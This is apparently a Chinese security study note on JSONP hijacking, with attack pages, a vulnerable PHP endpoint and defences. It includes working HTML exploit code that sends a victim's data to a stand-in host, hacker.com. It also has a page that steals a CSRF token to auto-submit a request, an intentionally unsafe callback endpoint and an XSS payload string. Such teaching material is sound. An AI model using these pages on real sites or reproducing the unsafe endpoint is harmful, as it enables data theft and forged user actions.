---
aliases: []
tags: ['Security','date/2022-11','year/2022','month/11']
date: 2022-11-30-星期三 19:56:15
update: 2022-12-01-星期四 14:36:58
---

## JSONP介绍

说起[[跨域]]请求资源的方法，最常见的方法是JSONP/CORS。下面以具体的例子介绍一下[[跨域#JSONP|JSONP]]的工作原理。

JSONP全称是JSON with Padding ，是基于JSON格式的为解决跨域请求资源而产生的解决方案。**他实现的基本原理是利用了HTML里script元素标签没有跨域限制**

JSONP原理就是动态插入带有跨域url的script标签，然后调用回调函数，把我们需要的json数据作为参数传入，通过一些逻辑把数据显示在页面上。

比如通过script访问`http://www.test.com/index.html?jsonpcallback=callback`, 执行完script后，会调用callback函数，参数就是获取到的数据。

JSONP劫持，实质上算是一种读类型的CSRF，在恶意的网页中构造恶意的JS代码，当合法用户点击该网页，由于目标站点存在JSONP劫持漏洞的接口，因此会将用户的该接口对应的信息劫持，并将其发送到攻击者的服务器。

## JSONP劫持

对于JSONP传输数据，正常的业务是用户在B域名下请求A域名下的数据，然后进行进一步操作。

但是对A域名的请求一般都需要身份验证，hacker怎么去获取到这些信息呢，我们可以自己构造一个页面，然后诱惑用户去点击，在这个页面里，我们去请求A域名资源，然后回调函数将请求到的资源发回到hacker服务器上。

没错JSONP劫持类似于[[前端安全：CSRF|CSRF]]漏洞，步骤大概如下图所示：

![[1666134937.png]]

利用代码如下所示：

```html
<html>
<head>
<title>test</title>
<meta charset="utf-8">
<script type="text/javascript">
function hehehe(obj){
    var myForm = document.createElement("form");
    myForm.action="http://hacker.com/redirect.php";
    myForm.method = "GET";  
    for ( var k in obj) {  
        var myInput = document.createElement("input");  
        myInput.setAttribute("name", k);  
        myInput.setAttribute("value", obj[k]);  
        myForm.appendChild(myInput);  
    }  
    document.body.appendChild(myForm);  
    myForm.submit();  
    document.body.removeChild(myForm);
}
</script>
</head>
<body>
<script type="text/javascript" src="http://localhost/callback.php?callback=hehehe"></script>
</body>
</html>
```

诱惑用户访问此html，会以用户的身份访问`http://localhost/callback.php?callback=hehehe`,拿到敏感数据，然后执行hehehe函数，将数据发送给`http://hacker.com/redirect.php`。抓包可以拦截到如下请求包：

```http
GET /redirect.php?customername1=user1&password=12345678 HTTP/1.1
Host: hacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://10.133.136.120/test.html
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

hacker只需要在redirect.php里，将数据保存下来，然后重定向到baidu.com，堪称一次完美的JSONP劫持。

## 利用JSONP绕过token防护进行csrf攻击

具体的实例可以看看参考文章2，3。

通过上面例子，我们知道JSONP可以获取敏感的数据，在某些情况下，还可以利用JSONP劫持绕过token限制完成csrf攻击。

假设有个场景是这样：服务端判断接收到的请求包，如果含有callback参数就返回JSONP格式的数据，否则返回正常页面。代码如下：test.php

```php
<!-- callback.php -->

<?php
    header('Content-type: application/json');
    //json数据
    $json_data = '{"customername1":"user1","password":"12345678"}';
    if(isset($_GET["callback"])){
        $callback = $_GET["callback"];
        //如果含有callback参数，输出jsonp格式的数据
        echo $callback . "(" . $json_data . ")";
    }else{
        echo $json_data;
    }
?>
```

对于场景，如果存在JSONP劫持劫持，我们就可以获取到页面中的内容，提取出csrf\_token，然后提交表单，造成csrf漏洞。示例利用代码如下(来自参考文章2)：

```html
<html>
<head>
<title>test</title>
<meta charset="utf-8">
</head>
<body>
<div id="test"></div>
<script type="text/javascript">
function test(obj){
    // 获取对象中的属性值
    var content = obj['html']
    // 正则匹配出参数值
    var token=content.match('token = "(.*?)"')[1];
    // 添加表单节点
    var parent=document.getElementById("test");
    var child=document.createElement("form");
    child.method="POST";
    child.action="http://vuln.com/del.html";
    child.id="test1"
    parent.appendChild(child);
    var parent_1=document.getElementById("test1");
    var child_1=document.createElement("input");
    child_1.type="hidden";child_1.name="token";child_1.value=token;
    var child_2=document.createElement("input");
    child_2.type="submit";
    parent_1.appendChild(child_1);
    parent_1.appendChild(child_2);
}
</script>
<script type="text/javascript" src="http://vuln.com/caozuo.html?htmlcallback=test"></script>
</body>
</html>
```

htmlcallback返回一个对象obj，以该对象作为参数传入test函数，操作对象中属性名为html的值，正则匹配出token，再加入表单，自动提交表单完成操作，用户点击该攻击页面即收到csrf攻击。

## JSONP劫持挖掘与防御

对于漏洞挖掘，我们首先需要尽可能的找到所有的接口，尤其是返回数据格式是JSONP的接口。(可以在数据包中检索关键词callback json jsonp email等，也可以加上callback参数，观察返回值是否变化)。

找到接口之后，还需要返回值包含敏感信息，并且能被不同的域的页面去请求获取(也就是是否存在refer限制,实际上，如果接口存在refer的限制，也是有可能被绕过的，计划以后的文章中再说)

对于JSONP劫持的防御，其实类似于csrf的防御。以下来源于参考文章4:

- 限制来源refer
- 按照JSON格式标准输出（设置Content-Type : application/json; charset=utf-8），预防`http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script>`形式的xss
- 过滤callback函数名以及JSON数据输出，预防xss

## 参考

- [JSONP 劫持原理与挖掘方法](https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/)
- [JSONP绕过CSRF防护token](https://xz.aliyun.com/t/5143)
- [分享一个jsonp劫持造成的新浪某社区CSRF蠕虫](https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html#)
- [JSONP 安全攻防技术](https://blog.knownsec.com/2015/03/jsonp_security_technic/)
